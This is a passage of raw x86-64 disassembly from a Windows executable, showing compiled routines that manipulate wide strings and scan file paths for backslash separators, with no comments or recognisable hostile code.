   140001e03:	0f 85 a1 00 00 00    	jne    0x140001eaa
   140001e09:	48 8d 45 8f          	lea    -0x71(%rbp),%rax
   140001e0d:	48 89 45 87          	mov    %rax,-0x79(%rbp)
   140001e11:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001e14:	0f 11 45 9f          	movups %xmm0,-0x61(%rbp)
   140001e18:	48 89 75 af          	mov    %rsi,-0x51(%rbp)
   140001e1c:	b8 07 00 00 00       	mov    $0x7,%eax
   140001e21:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   140001e25:	66 89 75 9f          	mov    %si,-0x61(%rbp)
   140001e29:	89 4d bf             	mov    %ecx,-0x41(%rbp)
   140001e2c:	44 0f b7 02          	movzwl (%rdx),%r8d
   140001e30:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140001e34:	48 8d 4d 8f          	lea    -0x71(%rbp),%rcx
   140001e38:	e8 b3 f4 ff ff       	call   0x1400012f0
   140001e3d:	90                   	nop
   140001e3e:	48 8d 45 8f          	lea    -0x71(%rbp),%rax
   140001e42:	48 89 45 87          	mov    %rax,-0x79(%rbp)
   140001e46:	8b 45 bf             	mov    -0x41(%rbp),%eax
   140001e49:	89 47 30             	mov    %eax,0x30(%rdi)
   140001e4c:	44 0f b7 45 8f       	movzwl -0x71(%rbp),%r8d
   140001e51:	48 8b 55 97          	mov    -0x69(%rbp),%rdx
   140001e55:	48 8b cf             	mov    %rdi,%rcx
   140001e58:	e8 93 f4 ff ff       	call   0x1400012f0
   140001e5d:	90                   	nop
   140001e5e:	48 8b 55 b7          	mov    -0x49(%rbp),%rdx
   140001e62:	48 83 fa 07          	cmp    $0x7,%rdx
   140001e66:	0f 86 0c 02 00 00    	jbe    0x140002078
   140001e6c:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140001e73:	00 
   140001e74:	48 8b 4d 9f          	mov    -0x61(%rbp),%rcx
   140001e78:	48 8b c1             	mov    %rcx,%rax
   140001e7b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001e82:	72 1c                	jb     0x140001ea0
   140001e84:	48 83 c2 27          	add    $0x27,%rdx
   140001e88:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001e8c:	48 2b c1             	sub    %rcx,%rax
   140001e8f:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001e93:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001e97:	76 07                	jbe    0x140001ea0
   140001e99:	ff 15 71 33 00 00    	call   *0x3371(%rip)        # 0x140005210
   140001e9f:	cc                   	int3
   140001ea0:	e8 97 21 00 00       	call   0x14000403c
   140001ea5:	e9 ce 01 00 00       	jmp    0x140002078
   140001eaa:	48 8d 55 8f          	lea    -0x71(%rbp),%rdx
   140001eae:	49 8b c9             	mov    %r9,%rcx
   140001eb1:	e8 ca f6 ff ff       	call   0x140001580
   140001eb6:	48 8b d8             	mov    %rax,%rbx
   140001eb9:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   140001ebd:	48 8b cf             	mov    %rdi,%rcx
   140001ec0:	e8 bb f6 ff ff       	call   0x140001580
   140001ec5:	90                   	nop
   140001ec6:	4c 8b cb             	mov    %rbx,%r9
   140001ec9:	4c 8b c0             	mov    %rax,%r8
   140001ecc:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   140001ed0:	e8 bb 1a 00 00       	call   0x140003990
   140001ed5:	90                   	nop
   140001ed6:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140001eda:	48 8b 55 df          	mov    -0x21(%rbp),%rdx
   140001ede:	48 3b ca             	cmp    %rdx,%rcx
   140001ee1:	73 1a                	jae    0x140001efd
   140001ee3:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140001ee7:	48 89 45 d7          	mov    %rax,-0x29(%rbp)
   140001eeb:	48 8d 45 c7          	lea    -0x39(%rbp),%rax
   140001eef:	48 83 fa 07          	cmp    $0x7,%rdx
   140001ef3:	48 0f 47 45 c7       	cmova  -0x39(%rbp),%rax
   140001ef8:	89 34 48             	mov    %esi,(%rax,%rcx,2)
   140001efb:	eb 0c                	jmp    0x140001f09
   140001efd:	45 33 c9             	xor    %r9d,%r9d
   140001f00:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   140001f04:	e8 c7 16 00 00       	call   0x1400035d0
   140001f09:	0f 10 75 c7          	movups -0x39(%rbp),%xmm6
   140001f0d:	0f 11 75 e7          	movups %xmm6,-0x19(%rbp)
   140001f11:	0f 10 7d d7          	movups -0x29(%rbp),%xmm7
   140001f15:	0f 11 7d f7          	movups %xmm7,-0x9(%rbp)
   140001f19:	48 8d 5f 10          	lea    0x10(%rdi),%rbx
   140001f1d:	48 8d 45 e7          	lea    -0x19(%rbp),%rax
   140001f21:	48 3b d8             	cmp    %rax,%rbx
   140001f24:	74 4d                	je     0x140001f73
   140001f26:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140001f2a:	48 83 fa 07          	cmp    $0x7,%rdx
   140001f2e:	76 31                	jbe    0x140001f61
   140001f30:	48 8b 0b             	mov    (%rbx),%rcx
   140001f33:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140001f3a:	00 
   140001f3b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001f42:	72 18                	jb     0x140001f5c
   140001f44:	48 83 c2 27          	add    $0x27,%rdx
   140001f48:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140001f4c:	49 2b c8             	sub    %r8,%rcx
   140001f4f:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140001f53:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001f57:	77 51                	ja     0x140001faa
   140001f59:	49 8b c8             	mov    %r8,%rcx
   140001f5c:	e8 db 20 00 00       	call   0x14000403c
   140001f61:	b8 07 00 00 00       	mov    $0x7,%eax
   140001f66:	0f 11 33             	movups %xmm6,(%rbx)
   140001f69:	0f 11 7b 10          	movups %xmm7,0x10(%rbx)
   140001f6d:	66 89 75 e7          	mov    %si,-0x19(%rbp)
   140001f71:	eb 04                	jmp    0x140001f77
   140001f73:	48 8b 45 ff          	mov    -0x1(%rbp),%rax
   140001f77:	48 83 f8 07          	cmp    $0x7,%rax
   140001f7b:	76 3a                	jbe    0x140001fb7
   140001f7d:	48 8d 14 45 02 00 00 	lea    0x2(,%rax,2),%rdx
   140001f84:	00 
   140001f85:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   140001f89:	48 8b c1             	mov    %rcx,%rax
   140001f8c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001f93:	72 1c                	jb     0x140001fb1
   140001f95:	48 83 c2 27          	add    $0x27,%rdx
   140001f99:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001f9d:	48 2b c1             	sub    %rcx,%rax
   140001fa0:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001fa4:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001fa8:	76 07                	jbe    0x140001fb1
   140001faa:	ff 15 60 32 00 00    	call   *0x3260(%rip)        # 0x140005210
   140001fb0:	cc                   	int3
   140001fb1:	e8 86 20 00 00       	call   0x14000403c
   140001fb6:	90                   	nop
   140001fb7:	48 8b 55 1f          	mov    0x1f(%rbp),%rdx
   140001fbb:	48 83 fa 07          	cmp    $0x7,%rdx
   140001fbf:	76 39                	jbe    0x140001ffa
   140001fc1:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140001fc8:	00 
   140001fc9:	48 8b 4d 07          	mov    0x7(%rbp),%rcx
   140001fcd:	48 8b c1             	mov    %rcx,%rax
   140001fd0:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001fd7:	72 1c                	jb     0x140001ff5
   140001fd9:	48 83 c2 27          	add    $0x27,%rdx
   140001fdd:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001fe1:	48 2b c1             	sub    %rcx,%rax
   140001fe4:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001fe8:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001fec:	76 07                	jbe    0x140001ff5
   140001fee:	ff 15 1c 32 00 00    	call   *0x321c(%rip)        # 0x140005210
   140001ff4:	cc                   	int3
   140001ff5:	e8 42 20 00 00       	call   0x14000403c
   140001ffa:	66 0f 6f 05 8e 38 00 	movdqa 0x388e(%rip),%xmm0        # 0x140005890
   140002001:	00 
   140002002:	f3 0f 7f 45 17       	movdqu %xmm0,0x17(%rbp)
   140002007:	66 89 75 07          	mov    %si,0x7(%rbp)
   14000200b:	48 8b 55 a7          	mov    -0x59(%rbp),%rdx
   14000200f:	48 83 fa 07          	cmp    $0x7,%rdx
   140002013:	76 39                	jbe    0x14000204e
   140002015:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000201c:	00 
   14000201d:	48 8b 4d 8f          	mov    -0x71(%rbp),%rcx
   140002021:	48 8b c1             	mov    %rcx,%rax
   140002024:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000202b:	72 1c                	jb     0x140002049
   14000202d:	48 83 c2 27          	add    $0x27,%rdx
   140002031:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002035:	48 2b c1             	sub    %rcx,%rax
   140002038:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   14000203c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002040:	76 07                	jbe    0x140002049
   140002042:	ff 15 c8 31 00 00    	call   *0x31c8(%rip)        # 0x140005210
   140002048:	cc                   	int3
   140002049:	e8 ee 1f 00 00       	call   0x14000403c
   14000204e:	c7 47 30 01 00 00 00 	movl   $0x1,0x30(%rdi)
   140002055:	48 8b 47 20          	mov    0x20(%rdi),%rax
   140002059:	48 8d 48 ff          	lea    -0x1(%rax),%rcx
   14000205d:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   140002062:	76 03                	jbe    0x140002067
   140002064:	48 8b 1b             	mov    (%rbx),%rbx
   140002067:	48 89 5f 08          	mov    %rbx,0x8(%rdi)
   14000206b:	66 03 c9             	add    %cx,%cx
   14000206e:	66 89 0f             	mov    %cx,(%rdi)
   140002071:	66 03 c0             	add    %ax,%ax
   140002074:	66 89 47 02          	mov    %ax,0x2(%rdi)
   140002078:	48 8b c7             	mov    %rdi,%rax
   14000207b:	4c 8d 9c 24 e0 00 00 	lea    0xe0(%rsp),%r11
   140002082:	00 
   140002083:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140002087:	41 0f 28 73 f0       	movaps -0x10(%r11),%xmm6
   14000208c:	41 0f 28 7b e0       	movaps -0x20(%r11),%xmm7
   140002091:	49 8b e3             	mov    %r11,%rsp
   140002094:	5f                   	pop    %rdi
   140002095:	5e                   	pop    %rsi
   140002096:	5d                   	pop    %rbp
   140002097:	c3                   	ret
   140002098:	cc                   	int3
   140002099:	cc                   	int3
   14000209a:	cc                   	int3
   14000209b:	cc                   	int3
   14000209c:	cc                   	int3
   14000209d:	cc                   	int3
   14000209e:	cc                   	int3
   14000209f:	cc                   	int3
   1400020a0:	40 53                	rex push %rbx
   1400020a2:	56                   	push   %rsi
   1400020a3:	57                   	push   %rdi
   1400020a4:	48 83 ec 70          	sub    $0x70,%rsp
   1400020a8:	49 8b d9             	mov    %r9,%rbx
   1400020ab:	49 8b f0             	mov    %r8,%rsi
   1400020ae:	48 8b fa             	mov    %rdx,%rdi
   1400020b1:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   1400020b6:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400020bb:	e8 c0 f4 ff ff       	call   0x140001580
   1400020c0:	90                   	nop
   1400020c1:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400020c4:	0f 11 44 24 28       	movups %xmm0,0x28(%rsp)
   1400020c9:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400020cc:	f3 0f 7f 4c 24 38    	movdqu %xmm1,0x38(%rsp)
   1400020d2:	48 8b 48 10          	mov    0x10(%rax),%rcx
   1400020d6:	48 3b ce             	cmp    %rsi,%rcx
   1400020d9:	0f 82 ca 00 00 00    	jb     0x1400021a9
   1400020df:	48 2b ce             	sub    %rsi,%rcx
   1400020e2:	48 3b cb             	cmp    %rbx,%rcx
   1400020e5:	48 0f 42 d9          	cmovb  %rcx,%rbx
   1400020e9:	48 83 78 18 07       	cmpq   $0x7,0x18(%rax)
   1400020ee:	76 03                	jbe    0x1400020f3
   1400020f0:	48 8b 00             	mov    (%rax),%rax
   1400020f3:	48 8d 14 70          	lea    (%rax,%rsi,2),%rdx
   1400020f7:	4c 8b c3             	mov    %rbx,%r8
   1400020fa:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400020ff:	e8 8c 13 00 00       	call   0x140003490
   140002104:	90                   	nop
   140002105:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   14000210a:	48 8b cf             	mov    %rdi,%rcx
   14000210d:	e8 be f2 ff ff       	call   0x1400013d0
   140002112:	90                   	nop
   140002113:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140002118:	48 83 fa 07          	cmp    $0x7,%rdx
   14000211c:	76 3b                	jbe    0x140002159
   14000211e:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002125:	00 
   140002126:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000212b:	48 8b c1             	mov    %rcx,%rax
   14000212e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002135:	72 1c                	jb     0x140002153
   140002137:	48 83 c2 27          	add    $0x27,%rdx
   14000213b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000213f:	48 2b c1             	sub    %rcx,%rax
   140002142:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002146:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000214a:	76 07                	jbe    0x140002153
   14000214c:	ff 15 be 30 00 00    	call   *0x30be(%rip)        # 0x140005210
   140002152:	cc                   	int3
   140002153:	e8 e4 1e 00 00       	call   0x14000403c
   140002158:	90                   	nop
   140002159:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   14000215e:	48 83 fa 07          	cmp    $0x7,%rdx
   140002162:	76 3a                	jbe    0x14000219e
   140002164:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000216b:	00 
   14000216c:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140002171:	48 8b c1             	mov    %rcx,%rax
   140002174:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000217b:	72 1c                	jb     0x140002199
   14000217d:	48 83 c2 27          	add    $0x27,%rdx
   140002181:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002185:	48 2b c1             	sub    %rcx,%rax
   140002188:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   14000218c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002190:	76 07                	jbe    0x140002199
   140002192:	ff 15 78 30 00 00    	call   *0x3078(%rip)        # 0x140005210
   140002198:	cc                   	int3
   140002199:	e8 9e 1e 00 00       	call   0x14000403c
   14000219e:	48 8b c7             	mov    %rdi,%rax
   1400021a1:	48 83 c4 70          	add    $0x70,%rsp
   1400021a5:	5f                   	pop    %rdi
   1400021a6:	5e                   	pop    %rsi
   1400021a7:	5b                   	pop    %rbx
   1400021a8:	c3                   	ret
   1400021a9:	e8 a2 0c 00 00       	call   0x140002e50
   1400021ae:	90                   	nop
   1400021af:	cc                   	int3
   1400021b0:	40 53                	rex push %rbx
   1400021b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400021b6:	48 8b 51 28          	mov    0x28(%rcx),%rdx
   1400021ba:	48 8b d9             	mov    %rcx,%rbx
   1400021bd:	48 83 fa 07          	cmp    $0x7,%rdx
   1400021c1:	76 32                	jbe    0x1400021f5
   1400021c3:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   1400021c7:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400021ce:	00 
   1400021cf:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400021d6:	72 18                	jb     0x1400021f0
   1400021d8:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   1400021dc:	48 83 c2 27          	add    $0x27,%rdx
   1400021e0:	49 2b c8             	sub    %r8,%rcx
   1400021e3:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   1400021e7:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400021eb:	77 20                	ja     0x14000220d
   1400021ed:	49 8b c8             	mov    %r8,%rcx
   1400021f0:	e8 47 1e 00 00       	call   0x14000403c
   1400021f5:	33 c0                	xor    %eax,%eax
   1400021f7:	48 c7 43 28 07 00 00 	movq   $0x7,0x28(%rbx)
   1400021fe:	00 
   1400021ff:	48 89 43 20          	mov    %rax,0x20(%rbx)
   140002203:	66 89 43 10          	mov    %ax,0x10(%rbx)
   140002207:	48 83 c4 20          	add    $0x20,%rsp
   14000220b:	5b                   	pop    %rbx
   14000220c:	c3                   	ret
   14000220d:	ff 15 fd 2f 00 00    	call   *0x2ffd(%rip)        # 0x140005210
   140002213:	cc                   	int3
   140002214:	cc                   	int3
   140002215:	cc                   	int3
   140002216:	cc                   	int3
   140002217:	cc                   	int3
   140002218:	cc                   	int3
   140002219:	cc                   	int3
   14000221a:	cc                   	int3
   14000221b:	cc                   	int3
   14000221c:	cc                   	int3
   14000221d:	cc                   	int3
   14000221e:	cc                   	int3
   14000221f:	cc                   	int3
   140002220:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002225:	55                   	push   %rbp
   140002226:	56                   	push   %rsi
   140002227:	57                   	push   %rdi
   140002228:	41 56                	push   %r14
   14000222a:	41 57                	push   %r15
   14000222c:	48 8d 6c 24 c9       	lea    -0x37(%rsp),%rbp
   140002231:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   140002238:	48 8b 05 01 5e 00 00 	mov    0x5e01(%rip),%rax        # 0x140008040
   14000223f:	48 33 c4             	xor    %rsp,%rax
   140002242:	48 89 45 27          	mov    %rax,0x27(%rbp)
   140002246:	48 8b f2             	mov    %rdx,%rsi
   140002249:	4c 8b f1             	mov    %rcx,%r14
   14000224c:	48 89 4d d7          	mov    %rcx,-0x29(%rbp)
   140002250:	48 89 55 1f          	mov    %rdx,0x1f(%rbp)
   140002254:	45 33 ff             	xor    %r15d,%r15d
   140002257:	48 8d 55 8f          	lea    -0x71(%rbp),%rdx
   14000225b:	48 8b ce             	mov    %rsi,%rcx
   14000225e:	e8 1d f3 ff ff       	call   0x140001580
   140002263:	48 8b d0             	mov    %rax,%rdx
   140002266:	48 83 78 18 07       	cmpq   $0x7,0x18(%rax)
   14000226b:	76 03                	jbe    0x140002270
   14000226d:	48 8b 10             	mov    (%rax),%rdx
   140002270:	48 8b 48 10          	mov    0x10(%rax),%rcx
   140002274:	48 85 c9             	test   %rcx,%rcx
   140002277:	74 32                	je     0x1400022ab
   140002279:	48 ff c9             	dec    %rcx
   14000227c:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140002283:	48 3b c8             	cmp    %rax,%rcx
   140002286:	48 0f 42 c1          	cmovb  %rcx,%rax
   14000228a:	48 8d 3c 42          	lea    (%rdx,%rax,2),%rdi
   14000228e:	66 83 3f 5c          	cmpw   $0x5c,(%rdi)
   140002292:	74 0f                	je     0x1400022a3
   140002294:	48 3b fa             	cmp    %rdx,%rdi
   140002297:	74 12                	je     0x1400022ab
   140002299:	48 83 ef 02          	sub    $0x2,%rdi
   14000229d:	66 83 3f 5c          	cmpw   $0x5c,(%rdi)
   1400022a1:	75 f1                	jne    0x140002294
   1400022a3:	48 2b fa             	sub    %rdx,%rdi
   1400022a6:	48 d1 ff             	sar    $1,%rdi
   1400022a9:	eb 07                	jmp    0x1400022b2
   1400022ab:	48 c7 c7 ff ff ff ff 	mov    $0xffffffffffffffff,%rdi
   1400022b2:	48 8b 55 a7          	mov    -0x59(%rbp),%rdx
   1400022b6:	48 83 fa 07          	cmp    $0x7,%rdx
   1400022ba:	76 39                	jbe    0x1400022f5
   1400022bc:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400022c3:	00 
   1400022c4:	48 8b 4d 8f          	mov    -0x71(%rbp),%rcx
   1400022c8:	48 8b c1             	mov    %rcx,%rax
   1400022cb:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400022d2:	72 1c                	jb     0x1400022f0
   1400022d4:	48 83 c2 27          	add    $0x27,%rdx
   1400022d8:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400022dc:	48 2b c1             	sub    %rcx,%rax
   1400022df:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400022e3:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400022e7:	76 07                	jbe    0x1400022f0
   1400022e9:	ff 15 21 2f 00 00    	call   *0x2f21(%rip)        # 0x140005210
   1400022ef:	cc                   	int3
   1400022f0:	e8 47 1d 00 00       	call   0x14000403c
   1400022f5:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   1400022f9:	0f 85 4a 01 00 00    	jne    0x140002449
   1400022ff:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002302:	0f 11 45 9f          	movups %xmm0,-0x61(%rbp)
   140002306:	0f 57 c9             	xorps  %xmm1,%xmm1
   140002309:	f3 0f 7f 4d af       	movdqu %xmm1,-0x51(%rbp)
   14000230e:	33 d2                	xor    %edx,%edx
   140002310:	44 8d 47 02          	lea    0x2(%rdi),%r8d
   140002314:	48 8d 4d 9f          	lea    -0x61(%rbp),%rcx
   140002318:	e8 33 10 00 00       	call   0x140003350
   14000231d:	44 89 7d bf          	mov    %r15d,-0x41(%rbp)
   140002321:	48 8d 45 9f          	lea    -0x61(%rbp),%rax
   140002325:	48 83 7d b7 07       	cmpq   $0x7,-0x49(%rbp)
   14000232a:	48 0f 47 45 9f       	cmova  -0x61(%rbp),%rax
   14000232f:	48 89 45 97          	mov    %rax,-0x69(%rbp)
   140002333:	66 44 89 7d 8f       	mov    %r15w,-0x71(%rbp)
   140002338:	0f b7 45 af          	movzwl -0x51(%rbp),%eax
   14000233c:	66 03 c0             	add    %ax,%ax
   14000233f:	66 89 45 91          	mov    %ax,-0x6f(%rbp)
   140002343:	4c 89 75 87          	mov    %r14,-0x79(%rbp)
   140002347:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000234a:	41 0f 11 46 10       	movups %xmm0,0x10(%r14)
   14000234f:	4d 89 7e 20          	mov    %r15,0x20(%r14)
   140002353:	49 c7 46 28 07 00 00 	movq   $0x7,0x28(%r14)
   14000235a:	00 
   14000235b:	66 45 89 7e 10       	mov    %r15w,0x10(%r14)
   140002360:	8b 46 30             	mov    0x30(%rsi),%eax
   140002363:	41 89 46 30          	mov    %eax,0x30(%r14)
   140002367:	44 0f b7 06          	movzwl (%rsi),%r8d
   14000236b:	48 8b 56 08          	mov    0x8(%rsi),%rdx
   14000236f:	49 8b ce             	mov    %r14,%rcx
   140002372:	e8 79 ef ff ff       	call   0x1400012f0
   140002377:	90                   	nop
   140002378:	49 8d 4e 38          	lea    0x38(%r14),%rcx
   14000237c:	48 89 4d 87          	mov    %rcx,-0x79(%rbp)
   140002380:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002383:	0f 11 41 10          	movups %xmm0,0x10(%rcx)
   140002387:	4c 89 79 20          	mov    %r15,0x20(%rcx)
   14000238b:	48 c7 41 28 07 00 00 	movq   $0x7,0x28(%rcx)
   140002392:	00 
   140002393:	66 44 89 79 10       	mov    %r15w,0x10(%rcx)
   140002398:	8b 45 bf             	mov    -0x41(%rbp),%eax
   14000239b:	89 41 30             	mov    %eax,0x30(%rcx)
   14000239e:	44 0f b7 45 8f       	movzwl -0x71(%rbp),%r8d
   1400023a3:	48 8b 55 97          	mov    -0x69(%rbp),%rdx
   1400023a7:	e8 44 ef ff ff       	call   0x1400012f0
   1400023ac:	90                   	nop
   1400023ad:	48 8b 55 b7          	mov    -0x49(%rbp),%rdx
   1400023b1:	48 83 fa 07          	cmp    $0x7,%rdx
   1400023b5:	76 39                	jbe    0x1400023f0
   1400023b7:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400023be:	00 
   1400023bf:	48 8b 4d 9f          	mov    -0x61(%rbp),%rcx
   1400023c3:	48 8b c1             	mov    %rcx,%rax
   1400023c6:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400023cd:	72 1c                	jb     0x1400023eb
   1400023cf:	48 83 c2 27          	add    $0x27,%rdx
   1400023d3:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400023d7:	48 2b c1             	sub    %rcx,%rax
   1400023da:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400023de:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400023e2:	76 07                	jbe    0x1400023eb
   1400023e4:	ff 15 26 2e 00 00    	call   *0x2e26(%rip)        # 0x140005210
   1400023ea:	cc                   	int3
   1400023eb:	e8 4c 1c 00 00       	call   0x14000403c
   1400023f0:	66 0f 6f 05 98 34 00 	movdqa 0x3498(%rip),%xmm0        # 0x140005890
   1400023f7:	00 
   1400023f8:	f3 0f 7f 45 af       	movdqu %xmm0,-0x51(%rbp)
   1400023fd:	66 44 89 7d 9f       	mov    %r15w,-0x61(%rbp)
   140002402:	48 8b 56 28          	mov    0x28(%rsi),%rdx
   140002406:	48 83 fa 07          	cmp    $0x7,%rdx
   14000240a:	0f 86 b7 01 00 00    	jbe    0x1400025c7
   140002410:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002417:	00 
   140002418:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   14000241c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002423:	0f 82 99 01 00 00    	jb     0x1400025c2
   140002429:	48 83 c2 27          	add    $0x27,%rdx
   14000242d:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140002431:	49 2b c8             	sub    %r8,%rcx
   140002434:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140002438:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000243c:	0f 86 7d 01 00 00    	jbe    0x1400025bf
   140002442:	ff 15 c8 2d 00 00    	call   *0x2dc8(%rip)        # 0x140005210
   140002448:	90                   	nop
   140002449:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   14000244d:	49 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%r9
   140002454:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   140002458:	48 8b ce             	mov    %rsi,%rcx
   14000245b:	e8 40 fc ff ff       	call   0x1400020a0
   140002460:	48 8b d8             	mov    %rax,%rbx
   140002463:	4c 8b cf             	mov    %rdi,%r9
   140002466:	45 33 c0             	xor    %r8d,%r8d
   140002469:	48 8d 55 8f          	lea    -0x71(%rbp),%rdx
   14000246d:	48 8b ce             	mov    %rsi,%rcx
   140002470:	e8 2b fc ff ff       	call   0x1400020a0
   140002475:	48 8b d0             	mov    %rax,%rdx
   140002478:	4c 89 75 87          	mov    %r14,-0x79(%rbp)
   14000247c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000247f:	41 0f 11 46 10       	movups %xmm0,0x10(%r14)
   140002484:	4d 89 7e 20          	mov    %r15,0x20(%r14)
   140002488:	49 c7 46 28 07 00 00 	movq   $0x7,0x28(%r14)
   14000248f:	00 
   140002490:	66 45 89 7e 10       	mov    %r15w,0x10(%r14)
   140002495:	8b 40 30             	mov    0x30(%rax),%eax
   140002498:	41 89 46 30          	mov    %eax,0x30(%r14)
   14000249c:	44 0f b7 02          	movzwl (%rdx),%r8d
   1400024a0:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   1400024a4:	49 8b ce             	mov    %r14,%rcx
   1400024a7:	e8 44 ee ff ff       	call   0x1400012f0
   1400024ac:	90                   	nop
   1400024ad:	49 8d 4e 38          	lea    0x38(%r14),%rcx
   1400024b1:	48 89 4d 87          	mov    %rcx,-0x79(%rbp)
   1400024b5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400024b8:	0f 11 41 10          	movups %xmm0,0x10(%rcx)
   1400024bc:	4c 89 79 20          	mov    %r15,0x20(%rcx)
   1400024c0:	48 c7 41 28 07 00 00 	movq   $0x7,0x28(%rcx)
   1400024c7:	00 
   1400024c8:	66 44 89 79 10       	mov    %r15w,0x10(%rcx)
   1400024cd:	8b 43 30             	mov    0x30(%rbx),%eax
   1400024d0:	89 41 30             	mov    %eax,0x30(%rcx)
   1400024d3:	44 0f b7 03          	movzwl (%rbx),%r8d
   1400024d7:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   1400024db:	e8 10 ee ff ff       	call   0x1400012f0
   1400024e0:	90                   	nop
   1400024e1:	48 8b 55 b7          	mov    -0x49(%rbp),%rdx
   1400024e5:	48 83 fa 07          	cmp    $0x7,%rdx
   1400024e9:	76 39                	jbe    0x140002524
   1400024eb:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400024f2:	00 
   1400024f3:	48 8b 4d 9f          	mov    -0x61(%rbp),%rcx
   1400024f7:	48 8b c1             	mov    %rcx,%rax
   1400024fa:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002501:	72 1c                	jb     0x14000251f
   140002503:	48 83 c2 27          	add    $0x27,%rdx
   140002507:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000250b:	48 2b c1             	sub    %rcx,%rax
   14000250e:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
